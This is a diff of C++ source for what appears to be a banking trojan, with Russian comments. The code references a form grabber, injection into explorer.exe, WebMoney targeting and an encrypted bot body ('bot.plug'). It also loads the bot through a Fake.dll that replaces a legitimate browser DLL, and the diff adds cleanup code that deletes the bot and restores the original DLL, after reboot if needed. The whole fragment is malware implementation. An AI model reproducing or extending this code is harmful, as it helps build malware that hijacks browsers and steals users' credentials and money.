@@ -59,11 +59,16 @@ DWORD dwGrabberRun	 = 0; //отработал ли граббер
 DWORD dwExplorerSelf = 0; //если инжект был в собственный эксплорер
 DWORD dwWebMoneySelf = 0;
 
+//глобальные переменные для хранения данных при запуске чере Fake.dll
+char FakeDllPathBot[MAX_PATH]; //путь к шифрованному телу бота (bot.plug)
+char FakeDllPathDll[MAX_PATH]; //путь к самой Fake.dll, ее заменена оригинальная dll
+char FakeDllPathOrigDll[MAX_PATH]; //путь к оригинальной длл
+
 //DWORD dwExplorerPid  = 0; //пид эксплорера
 
 DWORD WINAPI LoaderRoutine(LPVOID Data)
 {
-	BOT::Initialize();
+	BOT::Initialize(ProcessLoader);
 
 	DLLDBG("====>Bot DLL", "-------- LoaderRoutine (v10)");
 
@@ -176,7 +181,7 @@ DWORD WINAPI ExplorerMain(LPVOID Data)
 
 extern"C"  void WINAPI Start(LPVOID, LPVOID, LPVOID)
 {
-	BOT::Initialize();
+	BOT::Initialize(ProcessUnknown);
 	StartThread(ExplorerMain, NULL);
 }
 
@@ -189,7 +194,7 @@ BOOL APIENTRY MyDllMain( HMODULE hModule,
 	switch (ul_reason_for_call)
 	{
 		case DLL_PROCESS_ATTACH:
-			BOT::Initialize();
+			BOT::Initialize(ProcessUnknown);
 			pGetModuleFileNameA( NULL, buf, MAX_PATH );
 			DLLDBG( "MyDllMain", "Start bot.plug in process %s", buf );
 			if( File::GetNameHashA( buf, true ) == 0x490A0972 ) //стартуем если в процессе проводника (explorer.exe)
@@ -207,7 +212,7 @@ BOOL APIENTRY MyDllMain( HMODULE hModule,
 // Ф-ция для прыжка в Explorer при загрузке из StartFromFakeDll
 DWORD WINAPI ExplorerEntryPointFromFakeDll( LPVOID lpData )
 {
-	BOT::Initialize();
+	BOT::Initialize(ProcessUnknown);
 	DLLDBG("ExplorerEntryPointFromFakeDll", "Bot started in Explorer.exe" );
 	// При загрузке просто вызывает Start, предусмотренную для
 	// обычного запуска Bot.plug
@@ -228,9 +233,9 @@ BOOL WINAPI StartFromFakeDll( const char* pathBotPlug, const char* pathFakeDll, 
 	// Смотрим на то - запущен ли бот
 	HANDLE BotInstanceMutex = BOT::TryCreateBotInstance();
 	
-	m_lstrcpy( BOT::FakeDllPathBot, pathBotPlug );
-	m_lstrcpy( BOT::FakeDllPathDll, pathFakeDll );
-	m_lstrcpy( BOT::FakeDllPathOrigDll, pathOrigDll );
+	m_lstrcpy( FakeDllPathBot, pathBotPlug );
+	m_lstrcpy( FakeDllPathDll, pathFakeDll );
+	m_lstrcpy( FakeDllPathOrigDll, pathOrigDll );
 
 	DLLDBG("StartFromFakeDll", "BOT::TryCreateBotInstance() result=0x%X", BotInstanceMutex);
 	if (BotInstanceMutex == NULL) return FALSE;
@@ -241,5 +246,9 @@ BOOL WINAPI StartFromFakeDll( const char* pathBotPlug, const char* pathFakeDll, 
 
 bool FakeDllDelete()
 {
+	BOT::DeleteBotFile(FakeDllPathBot);
+	//если восстановить оригинальную длл сразу невозможно (ее держит браузер), то восстанавливаем после ребута
+	if( !pMoveFileExA( FakeDllPathOrigDll, FakeDllPathDll, MOVEFILE_REPLACE_EXISTING ) )
+		pMoveFileExA( FakeDllPathOrigDll, FakeDllPathDll, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
 	return true;
 }
